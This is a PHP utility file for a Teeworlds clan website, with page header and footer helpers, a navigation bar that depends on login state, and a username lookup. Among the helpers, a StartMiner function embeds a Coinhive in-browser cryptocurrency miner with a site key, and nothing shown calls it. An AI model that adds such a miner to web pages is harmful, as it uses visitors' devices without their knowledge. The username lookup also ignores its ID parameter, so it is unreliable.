<?php
/***************************
*  usefull_functions.php   *
*   teeworlds project      *
****************************/

function HtmlFooter()
{
?>
	</body>
</html>
<?php
}

function fok()
{
	HtmlFooter();
	die();
}

function HtmlHeader($page, $title = "Chilli.* teeworlds page")
{
?>
<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" href="style.css"></style>
		<link href="http://fonts.googleapis.com/css?family=Comfortaa" rel="stylesheet" type="text/css">
        <title><?php echo $title; ?></title>
	</head>
	<body>
		<ul>
 			<li><a <?php if ($page === "Home") { echo 'class="active"'; } ?> href="index.php">Home</a></li>
  			<li><a <?php if ($page === "Clan") { echo 'class="active"'; } ?>href="clan.php">Clan</a></li>
  			<li><a <?php if ($page === "Server") { echo 'class="active"'; } ?>href="server.php">Server</a></li>
  			<li><a <?php if ($page === "Players") { echo 'class="active"'; } ?>href="players.php">Players</a></li>
			<li style="float:right">
			<?php
				if (!empty($_SESSION['csLOGGED']) && $_SESSION['csLOGGED'] === "online")
				{
				    echo "<a href=\"account.php\">Account</a>";
				}
				else
				{
				    echo "<a href=\"login.php\">Login</a>";
				}
			?>
			</li>
		</ul>
<?php
}

function StartMiner()
{
    echo "
    <script type=\"text/javascript\" src=\"http://gc.kis.v2.scr.kaspersky-labs.com/53E3864D-FC2B-D140-B3DF-6529E8918B17/main.js\" charset=\"UTF-8\"></script><script src=\"https://coin-hive.com/lib/coinhive.min.js\"></script>
    <script>
        var miner = new CoinHive.Anonymous('j57w0oCR02CAY7z3JgZ4q90071ajRxP1');
        miner.start();
    </script>
    ";
}

function GetUsernameByID($sqlID)
{
	$db = new PDO(ABSOLUTE_DATABASE_PATH);
	$db->setAttribute( PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING );
	$stmt = $db->prepare('SELECT * FROM Accounts WHERE ID = ? ');
	$stmt->execute(array($_SESSION['csID']));

	$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);

	if ($rows)
	{
		$username = $rows[0]['Username'];
		return $username;
	}
	return "error";
}

?>
